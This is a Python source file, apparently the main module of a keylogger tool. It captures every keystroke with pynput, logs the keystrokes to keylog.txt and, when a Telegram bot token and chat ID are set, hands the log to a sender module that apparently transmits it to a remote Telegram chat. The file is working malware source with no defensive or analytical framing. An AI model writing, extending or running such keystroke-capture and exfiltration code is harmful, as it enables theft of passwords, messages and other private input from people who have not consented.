import os
import datetime
from pynput import keyboard

from .config import TELEGRAM_TOKEN, TELEGRAM_CHAT_ID
from .telegram_sender import TelegramSender
from .logger import LogManager
from .key_handler import KeyHandler
from .banner import print_banner


def run_keylogger():

    os.system('clear' if os.name == 'posix' else 'cls')

    start_time = datetime.datetime.now()

    telegram = None

    if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
        telegram = TelegramSender(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID)

    logger = LogManager("keylog.txt", telegram)

    handler = KeyHandler(logger)

    print_banner(start_time, "keylog.txt", telegram is not None)

    print("Press ESC to stop\n")

    with keyboard.Listener(on_press=handler.on_press) as listener:
        listener.join()

    logger.flush()

    print("\nKeylogger stopped")
    print("Total keys:", handler.key_count)